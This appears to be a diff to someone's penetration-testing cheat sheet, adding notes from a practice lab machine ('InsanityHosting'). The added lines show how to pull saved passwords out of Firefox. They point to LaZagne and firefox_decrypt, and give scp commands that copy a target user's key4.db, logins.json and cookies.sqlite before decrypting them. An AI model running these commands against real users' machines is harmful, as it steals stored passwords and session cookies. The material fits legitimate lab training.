@@ -270,9 +270,30 @@ ruby osert.rb generate -i <filename>.md
 ### Fun Fact
 
 https://github.com/AlessandroZ/LaZagne
+https://github.com/unode/firefox_decrypt
 
 ```
 Do this to find passwords in Firefox folder
 
 .\lazagne.exe all
+
+
+or use this tool to read through the various files in a .mozilla folder for passwords:
+
+https://github.com/unode/firefox_decrypt
+
+Like the InsanityHosting on PG:
+
+scp -o StrictHostKeyChecking=no -r elliot@$ip:/home/elliot/.mozilla/firefox/esmhp32w.default-default/cert9.db .
+
+scp -o StrictHostKeyChecking=no -r elliot@$ip:/home/elliot/.mozilla/firefox/esmhp32w.default-default/cookies.sqlite .
+
+scp -o StrictHostKeyChecking=no -r elliot@$ip:/home/elliot/.mozilla/firefox/esmhp32w.default-default/key4.db .
+
+scp -o StrictHostKeyChecking=no -r elliot@$ip:/home/elliot/.mozilla/firefox/esmhp32w.default-default/logins.json .
+
+/opt/firefox_decrypt/firefox_decrypt.py .
+
+
+
 ```
